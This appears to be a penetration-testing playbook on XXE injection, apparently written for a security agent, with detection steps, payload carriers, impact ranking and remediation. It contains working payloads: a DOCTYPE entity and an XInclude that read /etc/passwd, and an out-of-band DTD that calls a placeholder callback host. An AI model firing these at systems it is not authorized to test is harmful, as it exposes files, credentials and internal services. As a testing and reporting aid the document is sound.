# XXE - XML external entity injection

**When:** the app parses XML you supply: SOAP endpoints, `Content-Type:
application/xml`, SVG/docx/xlsx uploads, SAML, RSS import, doc converters.

## Detect (least dangerous first)

1. Local DTD with a known-readable file:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
```

`root:x:` in the response confirms classic XXE - quote it.

2. Entity expansion / error channel: if the file content does not reflect,
   an error containing the resolved entity still proves it.

3. Blind/OOB: point an external DTD at a controlled URL:

```xml
<!DOCTYPE r [<!ENTITY % d SYSTEM "http://YOUR-CALLBACK/x.dtd"> %d;]>
```

A callback proves the parser fetches - note the limitation if you cannot
receive callbacks, and try DNS-style channels only when observable.

## Alternative carriers

- SVG: `<svg xmlns=...><!DOCTYPE ...>` - uploads are frequently XML
- docx/xlsx: it's a zip of XML; entities inside `word/document.xml`
- SAML `Response`/`AuthnRequest` when the endpoint accepts POSTed XML
- Content-Type confusion: send the same JSON endpoint `application/xml`
- **XInclude** when DOCTYPE/ENTITY are filtered - no DTD needed:

```xml
<r xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</r>
```

`probe_xxe` tries this automatically after the entity payloads.

## Impact ranking for a report

1. File read shown inline (creds/config/keys): high-critical
2. SSRF via SYSTEM entity to internal hosts/metadata: high
3. Blind XXE confirmed by callback only: medium-high
4. DoS only (billion laughs): low-medium - do NOT run it beyond a tiny
   expansion proof on a real target

## Falsifier

DOCTYPE/ENTITY are rejected or stripped, and no parser error leaks
resolution behavior across the payload set.

## Remediation note for reports

Disable external entities/DTD processing in the parser (language-specific:
`FEATURE_SECURE_PROCESSING`, `libxml_disable_entity_loader`, defusedxml).
